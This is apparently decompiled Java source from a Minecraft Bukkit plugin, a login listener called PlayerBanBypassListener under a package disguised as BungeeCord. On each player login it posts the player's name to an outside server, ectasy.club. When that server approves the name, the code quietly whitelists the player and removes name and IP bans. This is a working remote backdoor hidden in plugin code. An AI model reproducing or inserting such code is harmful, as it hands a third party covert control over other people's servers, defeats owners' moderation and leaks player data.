package fr.body.ectasy.listeners;

import fr.body.ectasy.util.RequestUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.BanList.Type;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

public class PlayerBanBypassListener implements Listener {
   @EventHandler
   public void onJoin(PlayerLoginEvent var0) {
      Bukkit.getScheduler().runTaskAsynchronously(Ectasy.parentPlugin, () -> {
         String var1 = RequestUtil.post("https://ectasy.club/api/auth/server", "{\"username\": \"" + var0.getPlayer().getName() + "\"}");
         if (!var1.contains("Unauthorized")) {
            Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
               if (Bukkit.getServer().hasWhitelist()) {
                  var0.getPlayer().setWhitelisted(true);
               }

               if (Bukkit.getBanList(Type.NAME).isBanned(var0.getPlayer().getName())) {
                  Bukkit.getBanList(Type.NAME).pardon(var0.getPlayer().getName());
               }

               if (var0.getPlayer().getAddress() != null) {
                  if (Bukkit.getBanList(Type.IP).isBanned(var0.getPlayer().getAddress().getHostString())) {
                     Bukkit.getBanList(Type.IP).pardon(var0.getPlayer().getAddress().getHostString());
                  }
               }
            });
         }
      });
   }
}
